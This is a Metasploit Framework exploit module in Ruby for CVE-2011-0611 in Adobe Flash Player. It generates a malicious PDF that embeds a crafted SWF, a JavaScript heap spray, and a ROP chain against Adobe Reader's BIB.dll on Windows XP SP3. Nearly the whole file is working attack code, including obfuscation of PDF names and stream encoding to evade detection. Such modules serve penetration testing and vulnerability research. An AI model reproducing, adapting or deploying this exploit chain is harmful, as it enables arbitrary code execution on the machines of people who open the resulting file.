##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "Adobe Flash Player 10.2.153.1 SWF Memory Corruption Vulnerability",
      'Description'    => %q{
          This module exploits a vulnerability in Adobe Flash Player that was discovered, and
        has been exploited actively in the wild.  By embedding a specially crafted .swf file,
        Adobe Flash crashes due to an invalid use of an object type, which allows attackers to
        overwrite a pointer in memory, and results arbitrary code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown',   # Found being openly exploited
          'sinn3r',    # browser module
          'jduck'      # File format version
        ],
      'Version'        => '$Revision$',
      'References'     =>
        [
          [ 'CVE', '2011-0611' ],
          [ 'OSVDB', '71686' ],
          [ 'BID', '47314' ],
          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb11-07.html' ],
          [ 'URL', 'http://blogs.technet.com/b/mmpc/archive/2011/04/12/analysis-of-the-cve-2011-0611-adobe-flash-player-vulnerability-exploitation.aspx' ],
          [ 'URL', 'http://contagiodump.blogspot.com/2011/04/apr-8-cve-2011-0611-flash-player-zero.html' ],
          [ 'URL', 'http://bugix-security.blogspot.com/2011/04/cve-2011-0611-adobe-flash-zero-day.html' ],
          [ 'URL', 'http://secunia.com/blog/210' ],
          # For SWF->PDF embedding
          ['URL', 'http://feliam.wordpress.com/2010/02/11/flash-on-a-pdf-with-minipdf-py/']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC'             => 'process',
          'InitialAutoRunScript' => 'migrate -f',
          'DisablePayloadHandler' => 'true',
        },
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00",
          'DisableNops' => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested OK via Adobe Reader 10.0.1 on Windows XP SP3 (uses flash 10.2.152.23) -jjd
          [ 'Automatic', { }],
        ],
      'DisclosureDate' => 'Apr 11 2011',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
      ], self.class)
  end

  def exploit
    swf_data = make_swf()
    js_data = make_js(payload.encoded)

    # Create the pdf
    pdf = make_pdf(swf_data, js_data)

    print_status("Creating '#{datastore['FILENAME']}' file...")

    file_create(pdf)
  end

  def make_swf
    # load the static swf file
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2011-0611.swf")
    fd = File.open( path, "rb" )
    swf_data = fd.read(fd.stat.size)
    fd.close
    swf_data
  end

  def make_js(encoded_payload)

    # Generate the ROP payload
    rvas = rvas_bib_xpsp3()
    rop = generate_rop(rvas)
    #rop << "\xcc"
    rop << encoded_payload

    # Setup some JS vars
    var_unescape  = rand_text_alpha(rand(100) + 1)
    var_shellcode = rand_text_alpha(rand(100) + 1)

    var_start     = rand_text_alpha(rand(100) + 1)

    var_s         = 0x10000
    var_c         = rand_text_alpha(rand(100) + 1)
    var_b         = rand_text_alpha(rand(100) + 1)
    var_d         = rand_text_alpha(rand(100) + 1)
    var_3         = rand_text_alpha(rand(100) + 1)
    var_i         = rand_text_alpha(rand(100) + 1)
    var_4         = rand_text_alpha(rand(100) + 1)

    payload_buf = pattern_create(2048)
    payload_buf[1288, rop.length] = rop

    escaped_payload = Rex::Text.to_unescape(payload_buf)

    js = %Q|
var #{var_unescape} = unescape;
var #{var_shellcode} = #{var_unescape}( '#{escaped_payload}' );
var #{var_c} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
while (#{var_c}.length + 20 + 8 < #{var_s}) #{var_c}+=#{var_c};
#{var_b} = #{var_c}.substring(0, (0x0c0c-0x24)/2);
#{var_b} += #{var_shellcode};
#{var_b} += #{var_c};
#{var_d} = #{var_b}.substring(0, #{var_s}/2);
while(#{var_d}.length < 0x80000) #{var_d} += #{var_d};
#{var_3} = #{var_d}.substring(0, 0x80000 - (0x1020-0x08) / 2);
var #{var_4} = new Array();
for (#{var_i}=0;#{var_i}<0x1f0;#{var_i}++) #{var_4}[#{var_i}]=#{var_3}+"s";
|

    js
  end

  def RandomNonASCIIString(count)
    result = ""
    count.times do
      result << (rand(128) + 128).chr
    end
    result
  end

  def ioDef(id)
    "%d 0 obj\n" % id
  end

  def ioRef(id)
    "%d 0 R" % id
  end


  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
  def nObfu(str)
    result = ""
    str.scan(/./u) do |c|
      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
        result << "#%x" % c.unpack("C*")[0]
      else
        result << c
      end
    end
    result
  end


  def ASCIIHexWhitespaceEncode(str)
    result = ""
    whitespace = ""
    str.each_byte do |b|
      result << whitespace << "%02x" % b
      whitespace = " " * (rand(3) + 1)
    end
    result << ">"
  end


  def make_pdf(swf, js)

    swf_name = rand_text_alpha(8 + rand(8)) + ".swf"

    xref = []
    eol = "\n"
    endobj = "endobj" << eol

    # Randomize PDF version?
    pdf = "%PDF-1.5" << eol
    #pdf << "%" << RandomNonASCIIString(4) << eol

    # catalog
    xref << pdf.length
    pdf << ioDef(1) << nObfu("<</Type/Catalog")
    pdf << nObfu("/Pages ") << ioRef(3)
    pdf << nObfu("/OpenAction ") << ioRef(5)
    pdf << nObfu(">>")
    pdf << eol << endobj

    # pages array
    xref << pdf.length
    pdf << ioDef(3) << nObfu("<</Type/Pages/Count 1/Kids [") << ioRef(4) << nObfu("]>>") << eol << endobj

    # page 1
    xref << pdf.length
    pdf << ioDef(4) << nObfu("<</Type/Page/Parent ") << ioRef(3)
    pdf << nObfu("/Annots [") << ioRef(7) << nObfu("] ")
    pdf << nObfu(">>")
    pdf << eol << endobj

    # js action
    xref << pdf.length
    pdf << ioDef(5) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(6) + ">>" << eol << endobj

    # js stream
    xref << pdf.length
    compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
    pdf << ioDef(6) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
    pdf << "stream" << eol
    pdf << compressed << eol
    pdf << "endstream" << eol
    pdf << endobj

    # swf annotation object
    xref << pdf.length
    pdf << ioDef(7) << nObfu("<</Type/Annot/Subtype/RichMedia")
    pdf << nObfu("/Rect [20 20 187 69] ")
    pdf << nObfu("/RichMediaSettings ") << ioRef(8)
    pdf << nObfu("/RichMediaContent ") << ioRef(9)
    pdf << nObfu("/NM (") << swf_name << nObfu(")")
    pdf << nObfu(">>")
    pdf << eol << endobj

    # rich media settings
    xref << pdf.length
    pdf << ioDef(8)
    pdf << nObfu("<</Type/RichMediaSettings/Subtype/Flash")
    pdf << nObfu("/Activation ") << ioRef(10)
    pdf << nObfu("/Deactivation ") << ioRef(11)
    pdf << nObfu(">>")
    pdf << eol << endobj

    # rich media content
    xref << pdf.length
    pdf << ioDef(9)
    pdf << nObfu("<</Type/RichMediaContent")
    pdf << nObfu("/Assets ") << ioRef(12)
    pdf << nObfu("/Configurations [") << ioRef(14) << "]"
    pdf << nObfu(">>")
    pdf << eol << endobj

    # rich media activation / deactivation
    xref << pdf.length
    pdf << ioDef(10)
    pdf << nObfu("<</Type/RichMediaActivation/Condition/PO>>")
    pdf << eol << endobj

    xref << pdf.length
    pdf << ioDef(11)
    pdf << nObfu("<</Type/RichMediaDeactivation/Condition/XD>>")
    pdf << eol << endobj

    # rich media assets
    xref << pdf.length
    pdf << ioDef(12)
    pdf << nObfu("<</Names [(#{swf_name}) ") << ioRef(13) << nObfu("]>>")
    pdf << eol << endobj

    # swf embeded file ref
    xref << pdf.length
    pdf << ioDef(13)
    pdf << nObfu("<</Type/Filespec /EF <</F ") << ioRef(16) << nObfu(">> /F(#{swf_name})>>")
    pdf << eol << endobj

    # rich media configuration
    xref << pdf.length
    pdf << ioDef(14)
    pdf << nObfu("<</Type/RichMediaConfiguration/Subtype/Flash")
    pdf << nObfu("/Instances [") << ioRef(15) << nObfu("]>>")
    pdf << eol << endobj

    # rich media isntance
    xref << pdf.length
    pdf << ioDef(15)
    pdf << nObfu("<</Type/RichMediaInstance/Subtype/Flash")
    pdf << nObfu("/Asset ") << ioRef(13)
    pdf << nObfu(">>")
    pdf << eol << endobj

    # swf stream
    # NOTE: This data is already compressed, no need to compress it again...
    xref << pdf.length
    pdf << ioDef(16) << nObfu("<</Type/EmbeddedFile/Length %s>>" % swf.length) << eol
    pdf << "stream" << eol
    pdf << swf << eol
    pdf << "endstream" << eol
    pdf << endobj

    # trailing stuff
    xrefPosition = pdf.length
    pdf << "xref" << eol
    pdf << "0 %d" % (xref.length + 1) << eol
    pdf << "0000000000 65535 f" << eol
    xref.each do |index|
      pdf << "%010d 00000 n" % index << eol
    end

    pdf << "trailer" << eol
    pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol

    pdf << "startxref" << eol
    pdf << xrefPosition.to_s() << eol

    pdf << "%%EOF" << eol
    pdf
  end

  def rvas_bib_xpsp3()
    # BIB.dll from Reader 10.0.1 (Win32) on XPSP3
    # Just return this hash
    {
      'xchg esp, eax / ret'    => 0x133c,
      'int 3 / ret'            => 0xd75f,
      'ret 0x08'               => 0x13e8,
      'ret'                    => 0x133d,

      'pop ecx / ret'          => 0x15fb,
      #'mov eax, [ecx] / ret'   => 0x6fd4,

      'pop eax / ret'          => 0x75b1,
      'call [eax] / ret'       => 0x5342,

      'mov [eax], ecx / ret'   => 0x158d,

      'add eax, 4 / ret'       => 0xab7e,

      #'mov eax, ecx / pop ebp / ret' => 0x35c1,
      'push eax / adc al, 0x59 / pop ecx / ret' => 0xb80a,

      #'mov esp, ebp / pop ebp / ret' => 0xe1f7,
      #'pop ebp / ret'          => 0x15d9,

      'pop edi / pop esi / ret' => 0x114e,
    }
  end

  def generate_rop(rvas)
    # ROP fun! (XP SP3 English, Apr 21 2011)
    rvas.merge!({
      # Instructions / Name    => RVA
      'BaseAddress'            => 0x07000000,
      'imp_GetProcAddress'     => 0x11028,
      'imp_memcpy'             => 0x110f8,
      'data_Str'               => 0x19c9c,
      'data_VirtualAlloc'      => 0x19cac,
      'data_Code'              => 0x19cac,
    })

    # crash @ 0x30115037 / call [eax+8]
    rop_stack = [
      'ret 0x08',
      'ret',
      'xchg esp, eax / ret',  # lines up with call [eax+0x08] from trigger
      'ret',

      #'int 3 / ret',
      'ret',

      # Write the function name to data_Str
      'pop eax / ret',
      'data_Str',
      'pop ecx / ret',
      0x74726956,  # Virt
      'mov [eax], ecx / ret',
      'add eax, 4 / ret',
      'pop ecx / ret',
      0x416c6175,  # ualA
      'mov [eax], ecx / ret',
      'add eax, 4 / ret',
      'pop ecx / ret',
      0x636f6c6c,  # lloc
      'mov [eax], ecx / ret',

      # Get the function addr
      'pop eax / ret',
      'imp_GetProcAddress',

      'call [eax] / ret',
      0x7c800000,  # kernel32 base
      'data_Str',

      # Write the VirtualAlloc ptr to data_VirtualAlloc
      'push eax / adc al, 0x59 / pop ecx / ret',
      'pop eax / ret',
      'data_VirtualAlloc',
      'mov [eax], ecx / ret',

      # Call VirtualAlloc
      'call [eax] / ret',
         0,         # lpAddress
      0x1000,    # dwSize
      0x3000,    # flAllocationType
      0x40,      # flProt

      # Write the new RWX memory address to data_Code
      'push eax / adc al, 0x59 / pop ecx / ret',
      'pop eax / ret',
      'data_Code',
      'mov [eax], ecx / ret',

      # Copy the rest of the payload to our new buffer
      'pop eax / ret',
      'imp_memcpy',
      'call [eax] / ret',
      0x220f0000, # hardcoded :(
      0x111111b8, # hardcoded :(
      0x1000,

      # don't need anything since memcpy causes flow automatically into its first arg :)
    ]

    rop_stack.map! { |e|
      if e.kind_of? String
        # Meta-replace (RVA)
        raise RuntimeError, "Unable to locate key: \"#{e}\"" if not rvas[e]
        rvas['BaseAddress'] + rvas[e]

      elsif e == :unused
        # Randomize
        rand_text(4).unpack('V').first

      else
        # Literal
        e
      end
    }

    rop_stack.pack('V*')
  end

  def rva2addr(rvas, key)
    raise RuntimeError, "Unable to locate key: \"#{key}\"" if not rvas[key]
    rvas['BaseAddress'] + rvas[key]
  end

end
